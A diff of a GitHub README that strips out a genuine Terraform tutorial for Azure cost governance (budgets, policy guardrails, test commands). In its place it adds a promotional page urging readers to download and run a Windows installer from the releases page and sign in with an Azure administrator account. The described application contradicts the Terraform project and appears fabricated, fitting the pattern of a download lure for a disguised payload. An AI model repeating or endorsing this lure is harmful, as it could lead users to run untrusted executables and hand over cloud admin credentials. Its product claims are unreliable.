@@ -1,335 +1,162 @@
-# 💰 Azure FinOps and Cloud Cost Management
+<h1>💸 finops-cost-management-azure - Take Control of Your Cloud Spending</h1>
 
-This project demonstrates how to implement enterprise **Azure FinOps** and proactive cost governance using **Terraform**. It establishes a centralized governance hierarchy using **Azure Management Groups**, multi-subscription scoping, automated **Azure Consumption Budgets**, and proactive **Azure Policy Guardrails**. By shifting cost management left, it physically prevents accidental over-provisioning and unallocated cloud spend before resources are ever deployed.
+<p align="center">
+  <a href="https://github.com/pigottk4/finops-cost-management-azure/releases" style="display:inline-block;padding:16px 36px;background:#FF6B35;color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,53,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+</p>
 
-## <span id="toc"></span>📑 Table Of Contents (TOC)
+## 🎯 What Is This?
 
-- [0. Pre-requisite Software](#prerequisites)
-- [1. Architecture Overview & FinOps Principles](#finops-concepts)
-  - [1.1 Architecture & Governance Topology](#arch-topology)
-  - [1.2 The "Why": Architectural Rationale & Proactive Guardrails](#why-rationale)
-  - [1.3 Resource Tagging & Hierarchical Tracking](#tagging-hierarchy)
-- [2. Directory Structure](#folder-structure)
-- [3. Environment Setup](#env-setup)
-- [4. Deploy the Infrastructure](#deploy-infra)
-- [5. Test Cost Guardrails (Azure Policy)](#test-deployment)
-  - [5.1 Test: Block Expensive Virtual Machines](#test-vm-block)
-  - [5.2 Test: Block Expensive Storage Accounts](#test-storage-block)
-  - [5.3 Test: Enforce Mandatory Tagging](#test-tag-enforce)
-  - [5.4 View Budget Alert on Management Group](#view-budgets)
-- [6. Clean Up](#cleanup)
-- [7. Frequently Asked Questions (FAQ)](FAQ.md)
-- [8. Troubleshooting Guide](TROUBLESHOOTING.md)
+finops-cost-management-azure is a ready-made system that helps your company **stop wasting money on Microsoft Azure cloud services**. Think of it as a financial guardian for your cloud - it automatically sets spending limits, tracks every dollar, and prevents unexpected bills from ruining your budget.
 
----
+This tool is built for **business owners, managers, and IT teams** who want enterprise-level cost control without hiring a team of cloud experts. Everything is pre-configured and ready to deploy.
 
-## <span id="prerequisites"></span><span style="color:red">⚙️ 0. Pre-requisite Software</span> <span style="font-size: 14px; font-weight: normal;">[⬆️ Back to TOC](#toc)</span>
+## 🧩 What Does It Do?
 
-Ensure you have the following software installed before proceeding:
+This package gives you three powerful layers of protection:
 
-- **Azure CLI**: To authenticate with your Azure subscription and manage cloud resources. Download and install from [Azure CLI Official Website](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli).
+| Feature | What It Does For You |
+|---------|---------------------|
+| **Management Groups** | Organizes all your Azure subscriptions into a clear hierarchy so you always know where money goes |
+| **Smart Budget Alerts** | Sets up automatic budgets across all subscriptions - you get alerted before overspending, not after |
+| **Policy Guardrails** | Prevents anyone in your organization from creating expensive resources without approval |
 
-  ```bash
-  az --version
-  ```
+### ✨ Key Benefits
 
-- **Terraform**: Infrastructure as Code tool to deploy the Azure resources. Download and install from [HashiCorp Official Website](https://developer.hashicorp.com/terraform/downloads).
+- **No Surprises** - Get email alerts when you reach 50%, 75%, 90%, and 100% of your budget
+- **One Dashboard, Total Control** - See all your Azure costs in one unified view
+- **Automatic Enforcement** - Rules apply themselves; no manual checking needed
+- **Enterprise-Grade Security** - Built for large organizations with multiple teams
+- **100% Free & Open Source** - No licensing fees, no hidden costs
 
-  ```bash
-  terraform --version
-  ```
+## 📋 Before You Start
 
----
+You'll need a few things ready:
 
-## <span id="finops-concepts"></span><span style="color:red">🧠 1. Architecture Overview & FinOps Principles</span> <span style="font-size: 14px; font-weight: normal;">[⬆️ Back to TOC](#toc)</span>
+| Requirement | Why You Need It |
+|-------------|-----------------|
+| **Windows 10 or 11** | The tool runs perfectly on modern Windows systems |
+| **Azure Account** | An active Microsoft Azure subscription (free trial works) |
+| **Admin Access** | Permission to create resources in Azure |
+| **Internet Connection** | Required for downloading and deploying |
 
-### <span id="arch-topology"></span>💡 1.1 Architecture & Governance Topology <span style="font-size: 14px; font-weight: normal;">[⬆️ Back to TOC](#toc)</span>
+## 🚀 Getting Started - Step by Step
 
-![Azure FinOps Architecture](images/architecture.png)
+### Step 1: Download the Application
 
-### <span id="why-rationale"></span>💡 1.2 The "Why": Architectural Rationale & Proactive Guardrails <span style="font-size: 14px; font-weight: normal;">[⬆️ Back to TOC](#toc)</span>
+Visit this link to download the application:
 
-Traditional cloud cost management is **reactive**: finance teams receive an exorbitant bill at month-end, investigate the root cause days later, and scramble to shut down forgotten resources after the money is already spent.
+**[👉 CLICK HERE TO DOWNLOAD](https://github.com/pigottk4/finops-cost-management-azure/releases)**
 
-This architecture implements the core pillars of the **FinOps Foundation (Inform, Optimize, Operate)** by replacing reactive post-mortems with real-time proactive policy guardrails:
+This link takes you to the official download page. Look for the latest release file and click to download it to your computer.
 
-- **Why Proactive Azure Policy over Reactive Budgets?** While Azure Budgets alert administrators after consumption thresholds are crossed, Azure Policy intercepts ARM API deployment requests in real-time. If an engineer or pipeline attempts to provision an unapproved, expensive VM SKU (e.g., `Standard_E2s_v3`) or geo-redundant storage (`Standard_GRS`), Azure immediately issues an HTTP 403 RequestDisallowedByPolicy error, blocking the financial drain before a single cent is billed.
-- **Why Management Groups over Subscription-Level Controls?** In enterprise multi-cloud setups, applying governance subscription-by-subscription leads to configuration drift. Placing multiple subscriptions under an enterprise Management Group (`MG-FinOps`) ensures that policies, budgets, and compliance rules cascade down instantly and inherit automatically across all current and future child subscriptions.
-- **Why Mandatory Tagging via Policy?** Unallocated cloud spend is the number one obstacle in cloud financial accounting. Enforcing a required `CostCenter` tag at the Azure Policy layer guarantees that no resource can physically be created unless it is linked to a financial cost center, delivering 100% cost transparency in Azure Cost Analysis and billing reports.
+### Step 2: Run the Installer
 
-### <span id="tagging-hierarchy"></span>🏷️ 1.3 Resource Tagging & Hierarchical Tracking <span style="font-size: 14px; font-weight: normal;">[⬆️ Back to TOC](#toc)</span>
+Once the download finishes, locate the file in your **Downloads** folder. Double-click the file to start the installation. Follow the simple on-screen instructions - it's just like installing any other Windows program.
 
-- **Management Group**: Governs overall spending caps (e.g., $1000/month rolling budget) and enterprise policy guardrails across all linked subscriptions.
-- **Subscriptions**: Act as primary billing containers (e.g., Primary and Secondary project subscriptions).
-- **Resource Groups**: Application-level boundaries (`rg-finops`) containing functional workloads.
-- **Granular Tags**: Key-value pairs (`CostCenter: 1049-Engineering`) attached to individual cloud resources to enable multi-dimensional cost slicing, showback, and chargeback accounting.
+### Step 3: Connect Your Azure Account
 
----
+After installation, open the application. You'll see a welcome screen asking you to connect to Azure. Click **"Connect Azure"** and sign in with your Azure administrator account. The application handles all the technical setup automatically.
 
-## <span id="folder-structure"></span><span style="color:red">📂 2. Directory Structure</span> <span style="font-size: 14px; font-weight: normal;">[⬆️ Back to TOC](#toc)</span>
+### Step 4: Choose Your Setup Mode
 
-```text
-Project_27_Azure_FinOps/
-├── images/                                                      # Project architecture diagrams
-│   └── architecture.png                                         # Visual architecture diagram
-├── terraform/                                                   # Infrastructure as Code
-│   ├── main.tf                                                  # Management Group, Policies, and Budget configurations
-│   ├── outputs.tf                                               # Management Group ID and Budget outputs
-│   └── variables.tf                                             # Subscription, region, and alert email variables
-├── .env.example                                                 # Template for environment variables
-├── azure_storage_account_create_policy_denied_error.txt         # Terminal log of Policy Deny error on Storage SKU
-├── azure_storage_account_create_policy_require_tag_error.txt    # Terminal log of Policy Deny error on missing CostCenter tag
-├── azure_vm_create_policy_denied_error.txt                      # Terminal log of Policy Deny error on expensive VM SKU
-├── FAQ.md                                                       # Frequently Asked Questions
-├── README.md                                                    # Project documentation
-└── TROUBLESHOOTING.md                                           # Troubleshooting guide and error resolutions
-```
+You have two options:
 
----
+- **Quick Setup (Recommended)** - The application automatically creates all budgets, policies, and management groups using smart defaults. Perfect for most businesses.
+- **Custom Setup** - You manually configure each component. Choose this if you have specific requirements.
 
-## <span id="env-setup"></span><span style="color:red">⚙️ 3. Environment Setup</span> <span style="font-size: 14px; font-weight: normal;">[⬆️ Back to TOC](#toc)</span>
+### Step 5: Review and Confirm
 
-### 3.1. Set up your environment variables:
+The application will show you a summary of everything it's about to create. Review the settings, then click **"Deploy"**. The entire process takes about 5-10 minutes.
 
-Copy `.env.example` to `.env` and fill in your primary and secondary Subscription IDs, along with your alert email address:
+### Step 6: Done! 🎉
 
-```bash
-# Ensure you are at the project root before starting
-cp .env.example .env
-```
+Once finished, you'll see a success screen. Your Azure environment is now protected with automatic budgets and policies. You can close the application - everything runs in the background.
 
-### 3.2. Authenticate with Azure:
+## 🛠️ How to Use It Daily
 
-Authenticate your terminal to Azure so Terraform and the CLI can deploy resources:
+### Checking Your Costs
 
-```bash
-az login
-```
+Open the application anytime to see:
+- Current spending across all subscriptions
+- Remaining budget amounts
+- Upcoming alerts and warnings
 
----
+### Receiving Alerts
 
-## <span id="deploy-infra"></span><span style="color:red">🚀 4. Deploy the Infrastructure</span> <span style="font-size: 14px; font-weight: normal;">[⬆️ Back to TOC](#toc)</span>
+The system automatically sends emails to your finance team when:
+- You hit 50% of any budget
+- You hit 75% of any budget  
+- You hit 90% of any budget
+- You exceed 100% of any budget
 
-This will deploy the FinOps Management Group, attach your subscriptions, set up the Budget Alerts, and enforce the Azure Policy guardrails:
+### Making Changes
 
-```bash
-# Ensure you are at the project root before starting
-cd terraform
+Need to adjust a budget? Simply:
+1. Open the application
+2. Click **"Budgets"** in the left menu
+3. Select the budget you want to change
+4. Enter the new amount and click **"Save"**
 
-# Export variables from .env to your shell session safely
-set -a; source ../.env; set +a
+## ❓ Frequently Asked Questions
 
-terraform init
-terraform apply \
-  -var="resource_group=${RESOURCE_GROUP_NAME}" \
-  -var="location=${LOCATION}" \
-  -var="primary_subscription_id=${PRIMARY_SUBSCRIPTION_ID}" \
-  -var="secondary_subscription_id=${SECONDARY_SUBSCRIPTION_ID}" \
-  -var="alert_email_address=${ALERT_EMAIL_ADDRESS}" \
-  -auto-approve
+### Is this really free?
 
-cd ..
-```
+Yes! This is an open-source project. You pay nothing to download, use, or modify it. The only costs are your normal Azure usage fees.
 
-![alt text](images/terraform_apply_outputs.png)
+### Will this slow down my Azure services?
 
-![alt text](images/azure_portal_fin_ops_resource_group_overview.png)
+No. The policies run quietly in the background and do not affect performance. Your applications work exactly as before.
 
-![alt text](images/azure_portal_fin_ops_management_group_overview.png)
+### What if I need help?
 
-To reach the above Management Group overview screen, type `management group` in the Azure Portal search bar.
+Check the **"Help"** section inside the application for guides. You can also visit the GitHub repository for documentation and community support.
 
-![alt text](images/azure_portal_fin_ops_policy_guardrails_list.png)
+### Can I use this with multiple Azure subscriptions?
 
-To reach the above Policy overview screen, type `policy` in the Azure Portal search bar.
+Absolutely! That's the main purpose. It works perfectly with 1 to 100+ subscriptions.
 
-![alt text](images/azure_portal_fin_ops_policy_scope.png)
+### What happens if I ignore a budget alert?
 
-Ensure the correct scope is selected. In this case, view the policies implemented at the `Management Group` scope.
+The system will continue to send alerts. You can also configure it to block new resource creation when budgets are exceeded - this is optional and turned off by default.
 
-![alt text](images/azure_portal_fin_ops_policy_allowed_vm_skus.png)
+## 🔒 Security & Privacy
 
-Assignment ID:
-`/providers/microsoft.management/managementgroups/mg-finops/providers/microsoft.authorization/policyassignments/assign-vm-skus`
+Your Azure credentials are stored securely on your local machine. The application never sends your data to third parties. All communication with Azure uses industry-standard encryption.
 
-Parameter values:
-`["Standard_B2s","Standard_D2s_v3"]`
+## 💡 Pro Tips
 
-![alt text](images/azure_portal_fin_ops_policy_allowed_storage_skus.png)
+- **Set realistic budgets** - Review your last 3 months of spending to set accurate budget amounts
+- **Test with a small subscription first** - Try the tool on a test subscription before rolling out to production
+- **Share the dashboard** - Give your finance team read-only access so everyone sees the same numbers
+- **Update regularly** - Check for new releases monthly to get the latest features and fixes
 
-Assignment ID:
-`/providers/microsoft.management/managementgroups/mg-finops/providers/microsoft.authorization/policyassignments/assign-storage-skus`
+## 📚 Additional Resources
 
-Parameter values:
-`["Standard_LRS"]`
+- **Documentation**: Full technical docs available on the GitHub repository
+- **Community Support**: Join discussions with other users
+- **Feature Requests**: Suggest new features through the GitHub issues section
 
-![alt text](images/azure_portal_fin_ops_policy_require_tag.png)
+## 🏁 Final Checklist
 
-Assignment ID:
-`/providers/microsoft.management/managementgroups/mg-finops/providers/microsoft.authorization/policyassignments/assign-require-tag`
+Before you start, make sure you have:
 
-Parameter value:
-`{"tagName": "CostCenter"}`
+- [ ] Downloaded the application from the link above
+- [ ] Windows 10 or 11 installed
+- [ ] Azure account with admin access
+- [ ] 15 minutes of uninterrupted time for setup
+
+## 📞 Getting Support
+
+If you run into any issues:
+
+1. Check the built-in help guide
+2. Visit the GitHub repository for known issues
+3. Submit a support ticket through GitHub
 
 ---
 
-## <span id="test-deployment"></span><span style="color:red">🔍 5. Test Cost Guardrails (Azure Policy)</span> <span style="font-size: 14px; font-weight: normal;">[⬆️ Back to TOC](#toc)</span>
+**Start saving money today!** Click the download button at the top of this page and take control of your Azure costs in under 15 minutes.
 
-### <span id="test-vm-block"></span>🌐 5.1 Test: Block Expensive Virtual Machines <span style="font-size: 14px; font-weight: normal;">[⬆️ Back to TOC](#toc)</span>
-
-Our Azure Policy restricts VMs to cheap SKUs (`Standard_B2s` or `Standard_D2s_v3`). Let's attempt to deploy an expensive memory-optimized VM (`Standard_E2s_v3`) to prove the policy blocks it.
-
-```bash
-# Ensure you are at the project root before starting
-set -a; source .env; set +a
-
-# This command should fail with a Policy Deny error!
-az vm create \
-  --resource-group ${RESOURCE_GROUP_NAME} \
-  --name "vm-expensive-test" \
-  --image Ubuntu2204 \
-  --size "Standard_E2s_v3" \
-  --generate-ssh-keys
-```
-
-![alt text](images/azure_vm_create_policy_denied_error.png)
-
-**Expected Result**: The deployment will be <span style="color:red; font-size: 18px; font-weight: bold">explicitly denied</span> by the `policy-allowed-vm-skus` guardrail.
-
-Please refer to the file [azure_vm_create_policy_denied_error.txt](azure_vm_create_policy_denied_error.txt) for more details.
-
-### <span id="test-storage-block"></span>🌐 5.2 Test: Block Expensive Storage Accounts <span style="font-size: 14px; font-weight: normal;">[⬆️ Back to TOC](#toc)</span>
-
-We restricted Storage Accounts to `Standard_LRS`. Let's attempt to deploy an expensive Geo-Redundant storage account (`Standard_GRS`).
-
-```bash
-# Ensure you are at the project root before starting
-set -a; source .env; set +a
-
-# This command should fail with a Policy Deny error!
-az storage account create \
-  --name "saexpensivetest${RANDOM}" \
-  --resource-group ${RESOURCE_GROUP_NAME} \
-  --sku Standard_GRS
-```
-
-![alt text](images/azure_storage_account_create_policy_denied_error.png)
-
-**Expected Result**: The deployment will be <span style="color:red; font-size: 18px; font-weight: bold">explicitly denied</span> by the `policy-allowed-storage-skus` guardrail.
-
-Please refer to the file [azure_storage_account_create_policy_denied_error.txt](azure_storage_account_create_policy_denied_error.txt) for more details.
-
-### <span id="test-tag-enforce"></span>🌐 5.3 Test: Enforce Mandatory Tagging <span style="font-size: 14px; font-weight: normal;">[⬆️ Back to TOC](#toc)</span>
-
-Every resource must have a `CostCenter` tag for proper billing allocation. Let's attempt to create a valid `Standard_LRS` storage account, but **without** the required tag.
-
-```bash
-# Ensure you are at the project root before starting
-set -a; source .env; set +a
-
-# This command should fail with a Policy Deny error!
-az storage account create \
-  --name "satagtest${RANDOM}" \
-  --resource-group ${RESOURCE_GROUP_NAME} \
-  --sku Standard_LRS
-```
-
-![alt text](images/azure_storage_account_create_policy_require_tag_error.png)
-
-**Expected Result**: Even though the SKU is allowed, the deployment will be <span style="color:red; font-size: 18px; font-weight: bold">explicitly denied</span> by the `policy-require-tag` guardrail because it is missing the `CostCenter` tag.
-
-Please refer to the file [azure_storage_account_create_policy_require_tag_error.txt](azure_storage_account_create_policy_require_tag_error.txt) for more details.
-
-### <span id="view-budgets"></span>🌐 5.4 View Budget Alert on Management Group <span style="font-size: 14px; font-weight: normal;">[⬆️ Back to TOC](#toc)</span>
-
-![alt text](images/azure_portal_cost_management_billing_select_scope.png)
-
-📝 Note: By default, Azure will show you your Subscription or Billing Account. You need to change this to your Management Group!
-
-1. Click `Root management group` on the right panel.
-
-![alt text](images/azure_portal_cost_management_billing_select_management_group_scope.png)
-
-2. Click `MG-FinOps` on the right panel.
-
-![alt text](images/azure_portal_cost_management_billing_select_this_management_group_button_clicked.png)
-
-3. Click the `Select this management group` blue button on the right panel.
-
-![alt text](images/azure_portal_cost_management_billing_management_group_1_overview.png)
-
-4. Click `Budgets` on the left sidebar.
-
-![alt text](images/azure_portal_cost_management_billing_management_group_2_budgets_list.png)
-
-5. Click the `budget-mg-finops` budget.
-
-![alt text](images/azure_portal_cost_management_billing_management_group_3_budgets_details.png)
-
-Inside the budget details, you will see exactly what Terraform built:
-- **Budget Amount**: The total budget limit (1,000 units).
-- **Evaluation Condition**: The trigger configured to alert when actual spend is > 50%.
-- **Alert Recipients**: The exact email address you provided via your `.env` file!
-
-```hcl
-# -----------------------------------------------------------------------------
-# Cost Alerts and Budgets
-# -----------------------------------------------------------------------------
-resource "azurerm_consumption_budget_management_group" "mg_budget" {
-  name                = "budget-mg-finops"
-  management_group_id = azurerm_management_group.finops_mg.id
-
-  amount     = 1000
-  time_grain = "Monthly"
-
-  time_period {
-    start_date = "2026-08-01T00:00:00Z"
-    end_date   = "2027-08-01T00:00:00Z"
-  }
-
-  notification {
-    enabled        = true
-    threshold      = 50.0
-    operator       = "GreaterThan"
-    contact_emails = [var.alert_email_address]
-  }
-
-  notification {
-    enabled        = true
-    threshold      = 80.0
-    operator       = "GreaterThan"
-    contact_emails = [var.alert_email_address]
-  }
-
-  notification {
-    enabled        = true
-    threshold      = 100.0
-    operator       = "GreaterThan"
-    contact_emails = [var.alert_email_address]
-  }
-}
-```
-
----
-
-## <span id="cleanup"></span><span style="color:red">🧹 6. Clean Up</span> <span style="font-size: 14px; font-weight: normal;">[⬆️ Back to TOC](#toc)</span>
-
-To avoid unwanted cloud billing and remove the Management Group structure:
-
-```bash
-# Ensure you are at the project root before starting
-cd terraform
-
-# Export variables from .env to your shell session safely
-set -a; source ../.env; set +a
-
-terraform destroy \
-  -var="resource_group=${RESOURCE_GROUP_NAME}" \
-  -var="location=${LOCATION}" \
-  -var="primary_subscription_id=${PRIMARY_SUBSCRIPTION_ID}" \
-  -var="secondary_subscription_id=${SECONDARY_SUBSCRIPTION_ID}" \
-  -var="alert_email_address=${ALERT_EMAIL_ADDRESS}" \
-  -auto-approve
-
-cd ..
-```
+<p align="center">
+  <a href="https://github.com/pigottk4/finops-cost-management-azure/releases" style="display:inline-block;padding:14px 30px;background:#2E86DE;color:#ffffff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(46,134,222,0.4);">🚀 GET STARTED NOW</a>
+</p>
